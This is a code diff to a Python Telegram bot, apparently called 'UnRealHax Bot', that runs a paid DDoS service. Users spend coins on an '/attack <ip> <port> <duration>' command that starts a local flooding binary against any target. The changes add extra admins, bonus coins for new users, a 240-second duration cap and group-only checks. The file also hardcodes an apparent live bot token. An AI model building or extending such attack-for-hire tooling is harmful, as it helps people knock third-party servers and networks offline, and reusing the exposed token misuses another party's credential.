@@ -6,7 +6,7 @@ import subprocess
 
 # Configuration
 TELEGRAM_BOT_TOKEN = '7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM'  # Replace with your bot token
-ADMIN_USER_ID = 7163028849  # Replace with the admin user ID
+ADMIN_USER_IDS = [7163028849, 1234567890]  # List of admin user IDs  # Replace with the admin user ID
 ALLOWED_GROUP_ID = -1002298552334  # Replace with your Telegram group ID
 USERS_FILE = 'users.txt'
 WALLET_FILE = 'wallets.txt'
@@ -57,34 +57,39 @@ def log_attack(user_id, ip, port, duration, coins_deducted):
 users = load_users()
 coins = load_coins()
 wallets = load_wallets()  # Initialize an empty dictionary
+
+
+def is_group_chat(update: Update) -> bool:
+    chat_id = update.effective_chat.id
+    return chat_id == ALLOWED_GROUP_ID  # Replace with your group's ID
+
+
 # Handlers
 async def start(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    if chat_id != ALLOWED_GROUP_ID:
-        await update.message.reply_text("⚠️ Use commands in the allowed group only.")
+    if not is_group_chat(update):
+        await update.message.reply_text("⚠️ This bot can only be used in the specified group.")
         return
 
     message = (
         "🔥 Welcome to the UnRealHax Bot 🔥\n\n"
         "Commands:\n"
         "/attack <ip> <port> <duration> - Launch an attack\n"
-        "/myaccount - Check your coins\n"
-        "/history - View your attack logs\n"
+        "/account - Check your coins\n"
+        "/logs - View your attack logs\n"
     )
     await update.message.reply_text(message)
 
-async def manage(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    args = context.args
 
-    if chat_id != ALLOWED_GROUP_ID:
-        await update.message.reply_text("⚠️ Use commands in the allowed group only.")
+async def manage(update: Update, context: CallbackContext):
+    if update.effective_chat.id != ALLOWED_GROUP_ID:
+        await update.message.reply_text("⚠️ This bot can only be used in the specified group.")
         return
 
-    if update.effective_user.id != ADMIN_USER_ID:
+    if update.effective_user.id not in ADMIN_USER_IDS:  # Updated to allow multiple admins
         await update.message.reply_text("⚠️ You need admin privileges to use this command.")
         return
 
+    args = context.args
     if len(args) != 2:
         await update.message.reply_text("⚠️ Usage: /manage <add|rem> <user_id>")
         return
@@ -95,13 +100,17 @@ async def manage(update: Update, context: CallbackContext):
     if command == 'add':
         users.add(target_user_id)
         save_users(users)
-        await update.message.reply_text(f"✔️ User {target_user_id} added.")
+        if target_user_id not in coins:
+            coins[target_user_id] = 2000  # Add 2000 free coins for new users
+            save_coins(coins)
+        await update.message.reply_text(f"✔️ User {target_user_id} added with 2000 bonus coins.")
     elif command == 'rem':
         users.discard(target_user_id)
         save_users(users)
         await update.message.reply_text(f"✔️ User {target_user_id} removed.")
     else:
         await update.message.reply_text("⚠️ Invalid command. Use add or rem.")
+
 
 async def add_coin(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
@@ -111,7 +120,7 @@ async def add_coin(update: Update, context: CallbackContext):
         await update.message.reply_text("⚠️ Use commands in the allowed group only.")
         return
 
-    if update.effective_user.id != ADMIN_USER_ID:
+    if update.effective_user.id not in ADMIN_USER_IDS:
         await update.message.reply_text("⚠️ You need admin privileges to use this command.")
         return
 
@@ -161,6 +170,12 @@ async def history(update: Update, context: CallbackContext):
         await update.message.reply_text("⚠️ No logs found.")
 
 async def attack(update: Update, context: CallbackContext):
+    if not is_group_chat(update):
+        await update.message.reply_text("⚠️ This bot can only be used in the specified group.")
+        return
+
+    # Existing logic for attack command
+
     global attack_in_progress
 
     chat_id = update.effective_chat.id
@@ -185,6 +200,11 @@ async def attack(update: Update, context: CallbackContext):
     except ValueError:
         await update.message.reply_text("⚠️ Duration must be an integer.")
         return
+    
+    if duration > 240:
+        await update.message.reply_text("⚠️ Maximum attack duration is 240 seconds.")
+        return
+
 
     user_coins = coins.get(user_id, 0)
     if user_coins < duration:
@@ -206,7 +226,7 @@ async def run_attack(ip: str, port: str, duration: int, update: Update, context:
     try:
         # Run the binary file
         process = subprocess.Popen(
-            [f"./lgo", ip, port, str(duration), "900"],
+            [f"./lg", ip, port, str(duration), "900"],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE
         )
